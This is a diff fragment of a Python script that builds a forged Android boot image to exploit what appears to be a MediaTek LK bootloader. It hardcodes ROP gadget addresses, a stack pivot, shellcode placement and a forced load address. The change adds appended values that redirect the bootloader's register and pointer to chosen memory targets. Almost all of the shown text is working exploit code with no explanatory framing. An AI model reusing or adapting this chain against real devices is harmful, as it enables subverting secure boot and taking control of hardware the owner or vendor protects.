@@ -3,27 +3,18 @@ import struct
 
 base = 0x4BD00000
 
-# 0x0000000000050132 : pop {r0, r1, r2, r3, r6, r7, pc}
-#pop_r0_r1_r2_r3_r6_r7_pc = base + 0x50132|1
 # b5a4:       e8bdd1df        pop     {r0, r1, r2, r3, r4, r6, r7, r8, ip, lr, pc}
 pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0xb5a4
 
-# 0x0000000000018422 : pop {pc}
-#pop_pc = base + 0x18422|1
 # 249b8:       bd00            pop     {pc}
 pop_pc = base + 0x249b8|1
 
-# 0x0000000000025e9a : blx r3 ; movs r0, #0 ; pop {r3, pc}
-#blx_r3_pop_r3 = base + 0x25e9a|1
 # 150:       4798            blx     r3 ; pop {r3, pc}
 blx_r3_pop_r3 = base + 0x150|1
-
 
 cache_func = base + 0x31444
 
 test = base + 0x185 # prints "Error, the pointer of pidme_data is NULL."
-
-invalid = base + 0x3fbb0
 
 forced_addr = 0x45000000 
 #inject_addr = base + 0x5C000
@@ -39,18 +30,21 @@ shellcode_sz = 0x1000 # TODO: check size
 # 3088:       0913f04f        ldmdbeq r3, {r0, r1, r2, r3, r6, ip, sp, lr, pc}
 pivot = base + 0x3088;
 
+lk_offset = 0x5C0
+
+lk_r3_target = 0x46000020
+lk_ptr_target = 0x46000024
+
+r3_pc = base + (lk_offset - 0x218) 
+ptr_pc = base + (lk_offset - 0x208)
 
 def main():
     with open(sys.argv[1], "rb") as fin:
         #orig = fin.read(0x400)
         #fin.seek(0x800)
-        orig = fin.read()
+        orig = fin.read(lk_offset)
 
     hdr = bytes.fromhex("414E44524F494421")
-    #hdr += struct.pack("<II", 0x6D003C8, forced_addr)
-    #hdr += struct.pack("<II", 0x6D003C8, forced_addr)
-    #hdr += struct.pack("<II", 0x6D002C8, forced_addr)
-    #hdr += struct.pack("<II", 0x6D00390, forced_addr)
     hdr += struct.pack("<II", 0x6D00384, forced_addr)
     hdr += bytes.fromhex("0000000000000044000000000000F0400000004840000000000000002311040E00000000000000000000000000000000")
     hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
@@ -103,6 +97,7 @@ def main():
     hdr += b"\x00" * (0x6D00040 - len(hdr) - 0x200)
 
     hdr += orig
+    hdr += struct.pack("<ii", lk_r3_target - r3_pc, lk_ptr_target - ptr_pc)
 
     with open(sys.argv[3], "wb") as fout:
         fout.write(hdr)
